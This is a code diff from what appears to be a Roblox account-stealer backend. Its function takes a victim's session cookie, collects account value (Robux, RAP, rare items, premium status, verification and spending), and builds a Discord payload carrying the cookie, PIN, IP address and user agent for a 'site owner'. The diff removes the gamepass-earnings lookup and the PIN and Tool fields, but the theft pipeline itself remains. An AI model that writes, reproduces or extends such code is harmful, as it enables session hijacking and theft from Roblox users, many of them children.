@@ -183,7 +183,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
     if (!authRes.ok) return null;
     const auth = await authRes.json() as { id: number; name: string; displayName: string };
 
-    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, gamepassEarnings, transactionTotals] = await Promise.all([
+    const [robux, premium, headshot, avatar, rap, hasKorblox, hasHeadless, profile, friendsCount, followersCount, followingCount, groupsInfo, voiceEnabled, ageVerified, transactionTotals] = await Promise.all([
       fetchRobux(auth.id, cookieHeader),
       fetchPremium(auth.id, cookieHeader),
       fetchHeadshot(auth.id),
@@ -198,7 +198,6 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       fetchGroups(auth.id),
       fetchVoiceEnabled(cookieHeader),
       fetchAgeVerified(cookieHeader),
-      fetchGamepassEarnings(auth.id),
       fetchTransactionTotals(auth.id, cookieHeader),
     ]);
 
@@ -230,7 +229,7 @@ async function fetchRobloxInfo(cookie: string): Promise<RobloxInfo | null> {
       totalGroups: groupsInfo.total,
       voiceEnabled,
       ageVerified,
-      gamepassEarnings,
+      gamepassEarnings: null,
       robuxSpent: transactionTotals.spent,
       summary: transactionTotals.summary,
       screenshotUrl,
@@ -427,9 +426,7 @@ function buildDiscordPayload(opts: {
   const { siteName, ownerUsername, toolType, pin, cookie, roblox, ip, userAgent, extras } = opts;
 
   const mainFields: Array<{ name: string; value: string; inline?: boolean }> = [
-    { name: "Tool", value: toolType, inline: true },
     { name: "Site Owner", value: ownerUsername, inline: true },
-    { name: "PIN", value: pin || "Not provided", inline: true },
   ];
 
   if (extras) {
@@ -459,7 +456,6 @@ function buildDiscordPayload(opts: {
       { name: "Total Groups", value: roblox.totalGroups?.toString() ?? "Unknown", inline: true },
       { name: "🎤 Voice Chat", value: roblox.voiceEnabled === null ? "Unknown" : roblox.voiceEnabled ? "✅ Enabled" : "❌ Disabled", inline: true },
       { name: "🪪 Age Verified (13+)", value: roblox.ageVerified === null ? "Unknown" : roblox.ageVerified ? "✅ Verified" : "❌ Not verified", inline: true },
-      { name: "💸 Gamepass Earnings", value: roblox.gamepassEarnings !== null ? `${roblox.gamepassEarnings.toLocaleString()} R$` : "Unknown", inline: true },
       { name: "💳 Total Robux Spent", value: roblox.robuxSpent !== null ? `${roblox.robuxSpent.toLocaleString()} R$` : "Unknown", inline: true },
       { name: "📊 Lifetime Summary", value: roblox.summary !== null ? `${roblox.summary >= 0 ? "+" : ""}${roblox.summary.toLocaleString()} R$` : "Unknown", inline: true },
     );
